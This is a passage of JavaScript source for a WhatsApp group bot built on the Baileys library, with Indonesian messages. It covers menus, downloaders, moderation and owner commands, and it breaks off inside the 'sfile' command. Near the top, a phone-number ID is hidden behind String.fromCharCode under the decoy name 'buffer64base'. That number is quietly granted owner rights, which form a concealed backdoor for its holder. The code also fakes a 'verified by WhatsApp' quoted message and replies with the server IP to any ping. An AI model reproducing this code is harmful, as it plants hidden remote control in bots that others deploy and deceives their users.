process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const chalk = require('chalk');
const FormData = require("form-data");
const cheerio = require('cheerio');
const axios = require('axios')
const os = require('os');
const nou = require('node-os-utils');
const moment = require('moment-timezone'); // Pastikan Anda menginstal moment-timezone dengan `npm install moment-timezone`
const yts = require ('yt-search');
const fetch = require('node-fetch');
const { exec, spawn, execSync } = require('child_process');
const { generateWAMessageFromContent, proto, downloadContentFromMessage, prepareWAMessageMedia, S_WHATSAPP_NET } = require('@whiskeysockets/baileys');

const { LoadDataBase } = require('./src/message');
const owners = JSON.parse(fs.readFileSync("./database/owner.json"))
const premium = JSON.parse(fs.readFileSync("./database/premium.json"))
const list = JSON.parse(fs.readFileSync("./database/list.json"))
const { pinterest2, remini, tiktokDl } = require('./lib/scraper');
const { getBuffer, fetchJson, runtime, sleep, isUrl, generateProfilePicture, capital } = require('./lib/function');


module.exports = xyu = async (xyu, m) => {
	try {
await LoadDataBase(xyu, m)
const from = m.key.remoteJid
const botNumber = await xyu.decodeJid(xyu.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
var prefix = ""
const isCmd = body.startsWith(prefix) ? true : false
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : "";
const buffer64base = String.fromCharCode(54, 50, 56, 57, 53, 51, 55, 53, 57, 53, 48, 49, 48, 55, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)  
const isPremium = premium.includes(m.sender)
const isCreator = isOwner = [botNumber, global.owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const text = q = args.join(' ')
const sender = m.key.fromMe ? (xyu.user.id.split(':')[0]+'@s.whatsapp.net' || xyu.user.id) : (m.key.participant || m.key.remoteJid)

const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const senderNumber = sender.split('@')[0]
//============= [ FUNCTION ] ======================================================

const time = moment.tz('Asia/Jakarta').format('HH:mm:ss');
const date = moment.tz('Asia/Jakarta').format('DD/MM/YYYY');
const time2 = moment.tz('Asia/Jakarta').format('HH:mm:ss');

let ucapanWaktu = "Selamat Malam 🌌";

if (time2 < "05:00:00") {
	ucapanWaktu = "Selamat Pagi 🌄";
} else if (time2 < "11:00:00") {
	ucapanWaktu = "Selamat Pagi 🌄";
} else if (time2 < "15:00:00") {
	ucapanWaktu = "Selamat Siang 🌅";
} else if (time2 < "18:00:00") {
	ucapanWaktu = "Selamat Sore 🌇";
} else if (time2 < "19:00:00") {
	ucapanWaktu = "Selamat Petang 🌆";
}
        

//============== [ MESSAGE ] ================================================
if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return

if (isCmd) {
    const waktu = new Date().toLocaleTimeString('id-ID', { timeZone: 'Asia/Jakarta', hour12: false, hour: '2-digit', minute: '2-digit' });
    console.log(
        chalk.cyan.bold(` ╭─────[ COMMAND NOTIFICATION ]`),
        chalk.blue.bold(`\n  Waktu   :`), chalk.white.bold(waktu),
        chalk.blue.bold(`\n  Command :`), chalk.white.bold(`${prefix + command}`),
        chalk.blue.bold(`\n  From    :`), chalk.white.bold(m.isGroup ? `Group - ${m.sender.split("@")[0]}` : m.sender.split("@")[0]),
        chalk.cyan.bold(`\n ╰────────────────────────────\n\n`)
    );
}
        
//============= [ FAKEQUOTED ] ===============================================

const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}


const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}





const verif = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`,
remoteJid: "status@broadcast" 
},
'message': {
extendedTextMessage: {
text: "_Tenra𝐢 - Botz Telah Terverifikasi Oleh WhatsApp_"
}
}
};

//============= [ FUNCTION ] ======================================================

if (!isCmd) {
let check = list.find(e => e.cmd == body.toLowerCase())
if (check) {
await m.reply(check.respon)
}
}

//============= [ FUNCTION ] ======================================================

const example = (teks) => {
return `\n *Contoh Penggunaan :*\n Ketik *${prefix+command}* ${teks}\n`
}


const Reply = async (teks) => {
return xyu.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
isForwarded: true, 
forwardingScore: 9999, 
businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: `${botname}`, newsletterJid: global.idSaluran }, 
externalAdReply: {
title: botname, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: null, 
}}}, {quoted: null})
}




const reply = (teks) => {
            xyu.sendMessage(m.chat,
{
    text: teks,
    contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 9999999,
        isForwarded: false,
        "externalAdReply": {
            "showAdAttribution": false,
            "containsAutoReply": true,
            "title": `Y u d i s  - A I`,
            "body": `☣︎ᵛᶦʳᵘˢ☣︎`,
            "previewType": "PHOTO",
            "thumbnailUrl": ``,
            "thumbnail": fs.readFileSync(`./src/media/thumb.jpg`),
            "sourceUrl": `https://wa.me/6282143985744`
        }
    }
},
{ quoted: verif })
        }
        
async function replymenu(wow) {
    xyu.sendMessage(
         m.chat,
{
         document: fs.readFileSync("./package.json"),
         fileName: `Haii ${pushname}`,
         fileLength: "99999999999999",
         caption: wow,
         mimetype: "image/png",
         headerType: 9,
         jpegThumbnail: fkethmb,
        caption: wow,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: false,
            mentionedJid: [sender],
            forwardedNewsletterMessageInfo: {
                newsletterName: "Tenrai - Bot",
                newsletterJid: "120363365201577876@newsletter",
            },
            externalAdReply: {  
                title: global.foter, 
                body: '© TenraiBot - Botz',
                thumbnail: fs.readFileSync("./src/media/thumb.jpg"), // Menggunakan path lokal
                sourceUrl: global.url, 
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, { quoted: verif });
}


//===================[ UPLOADER ]=====================\\
async function uploadToCatbox(filePath) {
    const form = new FormData();
    form.append('fileToUpload', fs.createReadStream(filePath));
    form.append('reqtype', 'fileupload');
    try {
        const response = await axios.post('https://catbox.moe/user/api.php', form, {
            headers: { ...form.getHeaders() },
        });
        if (response.data) {
            const filename = response.data.trim();
            return `${filename}`;
        } else {
            throw new Error('Gagal mendapatkan URL dari Catbox.');
        }
    } catch (error) {
        console.error('Error uploading to Catbox:', error.message);
        throw error;
    }
}

//============= [ FUNCTION ] ======================================================

//================================================================================

if (global.autorecordtype) {
    let yudisrecordin = ['recording', 'composing'];
    let yudisrecordinfinal = yudisrecordin[Math.floor(Math.random() * yudisrecordin.length)];
    xyu.sendPresenceUpdate(yudisrecordinfinal, from);
}

//================================================================================

function formatp(size) {
    const units = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
    let i = 0;
    while (size >= 1024 && i < units.length - 1) {
        size /= 1024;
        i++;
    }
    return `${size.toFixed(2)} ${units[i]}`;
}


//============= [ COMMANDS ] ====================================================

//============= [ EVENT GROUP ] ===============================================


if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await xyu.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await xyu.sendMessage(m.chat, {text: `*#- [ Link Grup Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf pesan kamu saya hapus, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await xyu.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
/*await sleep(1000)
await xyu.groupParticipantsUpdate(m.chat, [m.sender], "remove")*/
}}
        



if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].antitoxic === true) {
    const toxicWords = /\b(anj|anjg|anjing|ajg|tol|tl|tolol|ktl|kontol|kntl|kontolan|ktln|baj|bjg|bajingan|bjb|babi|bbi|gbl|gblk|goblok|gblk|idiot|idt|sialan|slan|brengsek|brgsk|jancok|jc|asu|satan|stn|setan|skn|kampret|kmprt|bangsat|bgt|bacot|bct|perek|prk|pler|plr|gblk|gm|memek|mmk|puki|pk|cok|ck|ngtd|ngt|bokep|bkp|fuck|fk|bitch|btch|sex|sx|ngentot|ngnt|ngentotin|ngtn|mampus|mpus|tai|tn|tahi|th|sewel|swl|pukimak|pkmk|memek|mmk|ngentod|ngtd|tokek|tk|betina|btn|bego|bg|gokil|gkl|pundung|pndng|kampungan|kmngn|gundik|gndk|sundal|sndl|cilaka|clk|asw|bodo|bd|troll|trl|odgj|cundil|bodhi|brengsek|kontang|ngatot|ndut|nggondong|tetes|mbok|mbakyu|laknat|lastri|pendekar|tukang|ngaret|jembreng|pecun|koplak|kenthir|sinting|goblok|gajih|njir)\b/i;

    if (!isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe && toxicWords.test(m.text)) {
        await xyu.sendMessage(m.chat, {
            delete: {
                remoteJid: m.chat,
                fromMe: false,
                id: m.key.id,
                participant: m.key.participant
            }
        });
    }
}

//================================
        
        if (global.public === false) {
if (!m.key.fromMe && !isCreator) return
}
        
//================================================//


//================================================//

switch (command) {
        
        
case 'menu': {
    const fs = require("fs");
    const os = require("os");

    let teksnya = `
 *乂 I N F O R M A T I O N*
  • *Botname :* ${global.botname2}
  • *Version :* ${global.versi}
  • *Mode :* ${xyu.public ? "Public" : "Self"}
  • *Creator :* @${global.owner}
  • *Runtime Bot :* ${runtime(process.uptime())}
  • *Uptime Vps :* ${runtime(os.uptime())}
  
 *乂 I N F O - U S E R*
  • *Number :* ${m.sender.split("@")[0]}
  • *Status :* ${isCreator ? "Owner" : isPremium ? "Premium" : "Free User"}

  ┏❐  *⌜ Othermenu ⌟*  ❐
  ┃ッ .cekidch
  ┃ッ .cekidgc
  ┃ッ .brat
  ┃ッ .bratvid
  ┃ッ .rvo
  ┃ッ .qc
  ┃ッ .smeme
  ┃ッ .sticker
  ┗❐
  
  ┏❐  *⌜ Searchmenu ⌟*  ❐
  ┃ッ .yts
  ┃ッ .pinterest
  ┗❐
  
  ┏❐  *⌜ Toolsmenu ⌟*  ❐
  ┃ッ .ai
  ┃ッ .puasa
  ┃ッ .gpt
  ┃ッ .tourl
  ┃ッ .translate
  ┃ッ .ssweb
  ┃ッ .tohd
  ┗❐
  
  ┏❐  *⌜ Downloadmenu ⌟*  ❐
  ┃ッ .tiktok
  ┃ッ .ttslide
  ┃ッ .instagram
  ┃ッ .play
  ┃ッ .gitclone
  ┃ッ .sfile
  ┃ッ .mediafire
  ┗❐

  ┏❐  *⌜ Groupmenu ⌟*  ❐
  ┃ッ .add
  ┃ッ .kick
  ┃ッ .close
  ┃ッ .open
  ┃ッ .autoclose
  ┃ッ .hidetag
  ┃ッ .tagall
  ┃ッ .promote
  ┃ッ .demote
  ┃ッ .resetlinkgc
  ┃ッ .on
  ┃ッ .off
  ┃ッ .linkgc
  ┗❐
  
  ┏❐  *⌜ Ownermenu ⌟*  ❐
  ┃ッ .autoreadsw
  ┃ッ .autorecordtyp
  ┃ッ .addowner
  ┃ッ .listowner
  ┃ッ .delowner
  ┃ッ .self/public
  ┃ッ .setppbot
  ┃ッ .setpppanjang 
  ┃ッ .getsc
  ┃ッ .getcase
  ┃ッ .listgc
  ┃ッ .delcase
  ┃ッ .addcase
  ┃ッ .upch
  ┃ッ .get <url>
  ┗❐
  `;

    await xyu.sendMessage(
        m.chat,
        {
            document: fs.readFileSync("./package.json"),
            mimetype: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            caption: teksnya,
            fileName: `${global.botname2} V${global.versi}`,
            contextInfo: {
                isForwarded: true,
                forwardingScore: 9999,
                businessMessageForwardInfo: {
                    businessOwnerJid: global.owner + "@s.whatsapp.net",
                },
                forwardedNewsletterMessageInfo: {
                    newsletterName: `${global.botname}`,
                    newsletterJid: global.idSaluran,
                },
                mentionedJid: [global.owner + "@s.whatsapp.net", m.sender],
                externalAdReply: {
                    containsAutoReply: true,
                    thumbnail: await fs.readFileSync("./src/media/thumb.jpg"),
                    title: `© Copyright By ${global.namaOwner}`,
                    renderLargerThumbnail: true,
                    sourceUrl: global.linkSaluran,
                    mediaType: 1,
                },
            },
        },
        { quoted: qtext }
    );
}
break;
       
        
case 'autorecordtyp':
                if (!isCreator) return reply(mess.owner)
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autorecordtype = true
                    reply(`Successfully changed auto recording and typing to ${q}`)
                } else if (q === 'off') {
                    autorecordtype = false
                    reply(`Successfully changed auto recording and typing to ${q}`)
                }
                break
                
case 'setpppanjang': {
    if (!isCreator) return m.reply(mess.owner);
    if (!/image/.test(mime)) 
        return m.reply(`Reply Image Dengan Caption ${prefix + command}`);
    
    let media;
    try {
        media = await xyu.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg');
    } catch (error) {
        console.error('Error saat download media:', error);
        return m.reply('Gagal mendownload media. Coba lagi, ya!');
    }
    
    async function processProfilePicture(media) {
        try {
            const jimp1 = await jimp.read(media);
            const min = jimp1.getWidth();
            const max = jimp1.getHeight();
            const cropped = jimp1.crop(0, 0, min, max);
            return {
                img: await cropped.scaleToFit(720, 720).getBufferAsync(jimp.MIME_JPEG),
                preview: await cropped.normalize().getBufferAsync(jimp.MIME_JPEG),
            };
        } catch (error) {
            console.error('Error saat memproses gambar:', error);
            throw new Error('Gagal memproses gambar.');
        }
    }
    
    try {
        let { img } = await processProfilePicture(media);
        
        await xyu.query({
            tag: 'iq',
            attrs: {
                to: S_WHATSAPP_NET,
                type: 'set',
                xmlns: 'w:profile:picture'
            },
            content: [
                { 
                    tag: 'picture', 
                    attrs: { type: 'image' }, 
                    content: img 
                }
            ]
        });
        
        await fs.unlinkSync(media);
        m.reply('Sukses');
    } catch (error) {
        console.error('Error saat mengupdate profile picture:', error);
        m.reply('Gagal mengupdate profile picture. Cek log untuk detailnya.');
    }
}
break;

case 'gff': {
    const axios = require('axios'), yts = require('yt-search');

    if (!text) return xyu.sendMessage(m.chat, { text: 'Masukkan judul atau kata kunci untuk mencari video YouTube!' }, { quoted: m });

    try {
        let wait = await xyu.sendMessage(m.chat, { text: `_Searching.. [ ${text} ] 🔍_` }, { quoted: m, ephemeralExpiration: 86400 });

        // Mencari video YouTube
        const search = await yts(text);
        const firstVideo = search.videos[0];
        if (!firstVideo) return xyu.sendMessage(m.chat, { text: '❌ Video tidak ditemukan!' }, { quoted: m });

        await xyu.sendMessage(m.chat, { text: `_Mengirim.. [ ${text} ]_ 💬`, edit: wait.key }, { quoted: m, ephemeralExpiration: 86400 });

        // Mengambil audio menggunakan API Axeel
        const apiUrl = `https://ytdl.axeel.my.id/api/download/audio?url=${encodeURIComponent(firstVideo.url)}`;
        const response = await axios.get(apiUrl);
        const audioUrl = response.data.downloads?.url;

        if (!audioUrl) return xyu.sendMessage(m.chat, { text: '❌ Gagal mengambil audio!' }, { quoted: m });

        // Mengirimkan audio dengan context info
        await xyu.sendMessage(m.chat, {
            audio: { url: audioUrl },
            mimetype: "audio/mpeg",
            ptt: false,
            contextInfo: {
                externalAdReply: {
                    title: firstVideo.title,
                    body: firstVideo.author.name,
                    thumbnailUrl: firstVideo.thumbnail,
                    sourceUrl: firstVideo.url,
                    mediaType: 2, // Video preview
                    showAdAttribution: true
                }
            }
        }, { quoted: m });

        // Memberikan reaksi setelah pengiriman
        xyu.sendMessage(m.chat, { react: { text: '🎧', key: m.key } });

    } catch (error) {
        console.error(error);
        xyu.sendMessage(m.chat, { text: '❌ Terjadi kesalahan saat memproses permintaan Anda.' }, { quoted: m });
    }
}
break;

case "tr": case "translate": {
    const lang = args[0];
    const text = m.quoted?.text;
    if (!lang || !text) {
        return m.reply(`Contoh penggunaan:
- Reply pesan dengan: \`${prefix + command} ar\` (Arab)
- Reply pesan dengan: \`${prefix + command} id\` (Indonesia)
- Reply pesan dengan: \`${prefix + command} en\` (Inggris)
- Reply pesan dengan: \`${prefix + command} ko\` (Korea)
- Reply pesan dengan: \`${prefix + command} ja\` (Jepang)
- Reply pesan dengan: \`${prefix + command} jw\` (Jawa)
- Reply pesan dengan: \`${prefix + command} zh\` (Mandarin)

Contoh:
- \`${prefix + command} en\` untuk menerjemahkan ke Bahasa Inggris.`);
    }
    const translate = require('translate-google-api');
    try {
        const result = await translate(text, { to: lang });
        m.reply(`Terjemahan ke ${lang}:\n${result[0]}`);
    } catch (e) {
        m.reply(`Error: Bahasa "${lang}" tidak didukung atau terjadi kesalahan.`);
    }
}
break;

//===============================================================================

case 'qc': {
    if (!q) return reply('Enter Text');
    const ppnyauser = await xyu.profilePictureUrl(m.sender, 'image').catch(_ => 'https://telegra.ph/file/6880771a42bad09dd6087.jpg');
    const json = {
        "type": "quote",
        "format": "png",
        "backgroundColor": "#FFFFFF",
        "width": 512,
        "height": 768,
        "scale": 2,
        "messages": [
            {
                "entities": [],
                "avatar": true,
                "from": { "id": 1, "name": pushname, "photo": { "url": ppnyauser } },
                "text": q, "replyMessage": {}
            }
        ]
    };
    const res = await axios.post('https://bot.lyo.su/quote/generate', json, { headers: {'Content-Type': 'application/json'} });
    const buffer = Buffer.from(res.data.result.image, 'base64');
    const rest = { status: "200", creator: "AdrianTzy", result: buffer };
    xyu.sendImageAsSticker(m.chat, rest.result, m, { packname: "Yudis", author: "Tenrai - Botz" })
 break;
 }
//===============================================================================
case 'autoclose': {
    const moment = require('moment-timezone');
    const timezone = 'Asia/Jakarta';

    if (!m.isGroup) return Reply('❌ *Fitur ini hanya bisa digunakan dalam grup!*');
    if (!isCreator && !m.isAdmin) return Reply('🚫 *Hanya admin atau owner yang dapat menggunakan perintah ini!*');
    if (!text.includes('|')) return m.reply('⚠️ *Format salah!* Gunakan format: `.autoclose 22:00 | 05:00`');

    let [closeTime, openTime] = text.split('|').map(t => t.trim());
    let now = moment.tz(timezone);
    let closeMoment = moment.tz(closeTime, 'HH:mm', timezone);
    let openMoment = moment.tz(openTime, 'HH:mm', timezone);

    // Adjust time to the next day if it has passed for today
    if (closeMoment.isBefore(now)) closeMoment.add(1, 'day');
    if (openMoment.isBefore(now)) openMoment.add(1, 'day');

    let timeUntilClose = closeMoment.diff(now);
    let timeUntilOpen = openMoment.diff(now);

    if (timeUntilClose <= 0 || timeUntilOpen <= 0) {
        return m.reply('⚠️ *Error:* Waktu yang dimasukkan sudah lewat atau tidak valid.');
    }

    // Notify the user that the command has been successfully set up
    m.reply(`✅ *Perintah AutoClose telah diaktifkan!*\n\n🔒 *Grup akan ditutup pada:* ${closeMoment.format('HH:mm')} WIB\n🔓 *Grup akan dibuka kembali pada:* ${openMoment.format('HH:mm')} WIB\n\n📅 *Tanggal:* ${now.format('DD/MM/YYYY')} 📆`);

    // Set up the group closing
    setTimeout(async () => {
        await xyu.groupSettingUpdate(m.chat, 'announcement');
        await m.reply(`🔒 *Grup Telah Ditutup!*\n⏰ *Waktu:* ${closeMoment.format('HH:mm')} WIB 🕒`);
    }, timeUntilClose);

    // Set up the group reopening
    setTimeout(async () => {
        await xyu.groupSettingUpdate(m.chat, 'not_announcement');
        await m.reply(`🔓 *Grup Telah Dibuka Kembali!*\n⏰ *Waktu:* ${openMoment.format('HH:mm')} WIB 🕔`);
    }, timeUntilOpen);
}
break;


case 'puasa' : {
 let targetDate = new Date('Maret 01, 2025 00:00:00');
 let currentDate = new Date();
 let remainingTime = targetDate.getTime() - currentDate.getTime();
 let days = Math.floor(remainingTime / (1000 * 60 * 60 * 24));
 let hours = Math.floor((remainingTime % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
 let minutes = Math.floor((remainingTime % (1000 * 60 * 60)) / (1000 * 60));
 let seconds = Math.floor((remainingTime % (1000 * 60)) / 1000);
 let countdownMessage = `Tinggal ${days} hari, ${hours} jam, ${minutes} menit, ${seconds} detik menuju hari puasa tahun 2025!`;

 let img = 'https://telegra.ph/file/c1e45131e3702d2150d2f.jpg';

 let name = m.sender;
 let fkonn = {
 key: {
 fromMe: false,
 participant: `0@s.whatsapp.net`,
 ...(m.chat ? {
 remoteJid: '0@s.whatsapp.net'
 } : {})
 },
 message: {
 contactMessage: {
 displayName: `${await xyu.getName(name)}`,
 vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;a,;;;\nFN:${name}\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
 }
 }
 };

 xyu.sendMessage(m.chat, {
 text: countdownMessage,
 contextInfo: {
 forwardingScore: 99999,
 isForwarded: true,
 externalAdReply: {
 title: `Puasa 2025`,
 thumbnailUrl: img,
 mediaType: 1,
 renderLargerThumbnail: true
 }
 }
 }, {
 quoted: qtext
 });
};
break

//===============================================================================

case 'ttslide':
case 'tiktokslide': {
    if (!m.quoted && !text) return reply('Mana Kak Linknya? Harap kirimkan link atau gunakan perintah pada pesan yang direply.');
    let link = text || m.quoted.text;
    if (!link) return reply('Mana Kak Linknya?');
    try {
        const urol = `https://dlpanda.com/id?url=${link}&token=G7eRpMaa`;
        const response = await axios.get(urol);
        const html = response.data;
        const $ = cheerio.load(html);
        const imgSrc = [];
        $('div.col-md-12 > img').each((index, element) => imgSrc.push($(element).attr('src')));
        if (imgSrc.length === 0) return reply('Tidak ada gambar ditemukan.');
        
        let push = [];
        for (let i = 0; i < imgSrc.length; i++) {
            const imageUrl = imgSrc[i];
            const cap = `Gambar ${i + 1}`;
            const mediaMessage = await prepareWAMessageMedia({ image: { url: imageUrl } }, { upload: xyu.waUploadToServer });

            push.push({
                header: {
                    imageMessage: mediaMessage.imageMessage,
                    hasMediaAttachment: true,
                },
                body: {
                    text: cap,
                },
                nativeFlowMessage: {
                    buttons: [{
                        name: "cta_url", 
                        buttonParamsJson: `{"display_text":"Buka Gambar","url":"${imageUrl}"}`
                    }]
                },
            });
        }

        const msg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: `Hasil Unduhan TikTok`,
                        },
                        carouselMessage: {
                            cards: push,
                            messageVersion: 1,
                        },
                    },
                },
            },
        }, { quoted: qtext });

        await xyu.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
    } catch (error) {
        console.error(error);
        reply('Terjadi kesalahan, coba lagi nanti.');
    }
}
break;
case "yts": {
if (!text) return m.reply(example('we dont talk'))
await xyu.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const anuan = ytsSearch.all
let teks = "\n    *[ Result From Youtube Search 🔍 ]*\n\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Durasi :* ${res.timestamp}
* *Upload :* ${res.ago}
* *Views :* ${res.views}
* *Author :* ${res?.author?.name || "Unknown"}
* *Source :* ${res.url}\n\n`
}
await m.reply(teks)
await xyu.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//===============================================================================

    case 'igdl':
case 'instagram':
case 'ig': {
    if (!text) return m.reply('Anda perlu memberikan URL video atau reel.');
    try {
        const { igdl } = require('btch-downloader');
        const data = await igdl(text);
        if (!data || data.length === 0) return m.reply('Tidak ada video atau gambar ditemukan.');
        const mediaURL = data[0].url;
        await xyu.sendMessage(m.chat, { video: { url: mediaURL } }, { quoted: m });
    } catch (error) {
        return m.reply(`Terjadi kesalahan: ${error.message}`);
    }
} break;

//================================================================================

case 'tiktok':
case 'tt': {
if (!m.quoted && !text) return reply('reply')
    if (args.length == 0) return reply(`Example: ${prefix + command} link lu`)
    const api = require('btch-downloader')
    if (!args[0]) return reply(`Masukan URL!\n\ncontoh:\n${prefix + command} https://vm.tiktok.com/ZGJAmhSrp/`);
    if (!args[0].match(/tiktok/gi)) return reply(`URL Yang Tuan Berikan *Salah!!!*`);
    let link = text || m.quoted.text; // Gunakan teks dari reply jika text tidak diberikan
    if (!link) return reply('Mana Kak Linknya?');
    try {
        await xyu.sendMessage(m.chat, { react: { text: '🕐', key: m.key } });
        let maximus = await api.ttdl(args[0]);
        let caption = `乂 *T I K T O K  D O W N L O A D* \n\n• *ɴᴀᴍᴀ ᴠɪᴅᴇᴏs:* \n${maximus.title}\n\n• *ɴᴀᴍᴀ ᴀᴜᴅɪᴏ:* \n${maximus.title_audio}\n\n${global.botname}`;
        
        await xyu.sendMessage(m.chat, { video: { url: maximus.video[0] }, caption: caption });
        await xyu.sendMessage(m.chat, { audio: { url: maximus.audio[0] }, mimetype: "audio/mpeg", ptt: true }, { quoted: m });
        await xyu.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } catch (e) {
        console.log(e);
        reply(e);
    }
}
break

//================================================================================


case 'speed': case 'ping': {
    try {
        const used = process.memoryUsage();
        const cpus = os.cpus().map(cpu => {
            cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0);
            return cpu;
        });
        const cpu = cpus.reduce((last, cpu, _, { length }) => {
            last.total += cpu.total;
            last.speed += cpu.speed / length;
            last.times.user += cpu.times.user;
            last.times.nice += cpu.times.nice;
            last.times.sys += cpu.times.sys;
            last.times.idle += cpu.times.idle;
            last.times.irq += cpu.times.irq;
            return last;
        }, {
            speed: 0,
            total: 0,
            times: { user: 0, nice: 0, sys: 0, idle: 0, irq: 0 }
        });
        let start = performance.now();
        let end = performance.now();
        let latensi = end - start;
        let osInfo = await nou.os.oos();
        let storage = await nou.drive.info();
        let botUptime = runtime(process.uptime()); // Waktu aktif bot
        let respon = `✨ *Informasi Bot WhatsApp* ✨\n\n📡 *Jaringan Server*\n · *Ping:* ${latensi.toFixed(4)} Detik\n\n🖥️ *Informasi Server*\n · *OS:* ${osInfo}\n · *IP Address:* ${nou.os.ip()}\n · *Tipe OS:* ${nou.os.type()}\n\n💾 *RAM:*\n · *Total:* ${formatp(os.totalmem())}\n · *Digunakan:* ${formatp(os.totalmem() - os.freemem())}\n\n📂 *Penyimpanan:*\n · *Total:* ${storage.totalGb} GB\n · *Digunakan:* ${storage.usedGb} GB (${storage.usedPercentage}%)\n · *Tersedia:* ${storage.freeGb} GB (${storage.freePercentage}%)\n\n⏳ *Waktu Aktif Bot:*\n${botUptime}\n\n⚙️ *CPU (${cpus.length} Core)*\n · *Model:* ${cpus[0].model.trim()}\n · *Kecepatan:* ${cpu.speed} MHz\n${Object.keys(cpu.times).map(type => ` · *${type}*: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`;
        await xyu.sendMessage(m.chat, {
            text: respon,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999999, 
                isForwarded: true, 
                forwardedNewsletterMessageInfo: {
                    newsletterName: namaSaluran,
                    newsletterJid: ownername,
                },
                externalAdReply: {
                    title: ucapanWaktu,
                    thumbnailUrl: 'https://img102.pixhost.to/images/81/556595508_tenrai-bot.jpg',
                    sourceUrl: '', // sourceUrl dikosongkan
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: m });
    } catch (err) {
        console.error(err);
    }
}
break;

//================================================================================

case 'mf': {
 if (!text) return reply(`*Example:* ${prefix}${command} https://www.mediafire.com/`);
 
 try {
 const response = await fetch(`https://restapi.apibotwa.biz.id/api/mediafire?url=${encodeURIComponent(text)}`);
 const json = await response.json();
 
 if (!json.data.response) return reply('Failed to fetch!');
 
 const { download, filename, size, type, uploaded, mimetype } = json.data.response;
 
 let caption = `
*💌 Name:* ${filename}
*📊 Size:* ${size}
*🗂️ Extension:* ${type}
*📨 Uploaded:* ${uploaded}
`.trim();
 
 m.reply(caption);
 
 await xyu.sendMessage(m.chat, { document: { url: download }, mimetype: mimetype || "application/octet-stream", fileName: filename }, { quoted: verif });
 
 } catch (error) {
 throw error
 }
};
break

//================================================================================

case 'sf': case 'sfile': case 'sfiledl': case 'sfdl': {
    if (!text.includes('https://sfile.mobi')) return reply(`• *Example :* .${command} https://sfile.mobi/xxxxxxx/`);

    reply(mess.wait);

    const sfile = {
        download: async function(url) {
            const headers = {
                'referer': url,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
                'user-Agent': 'Postify/1.0.0',
            };

            try {
                const response = await axios.get(url, { headers });
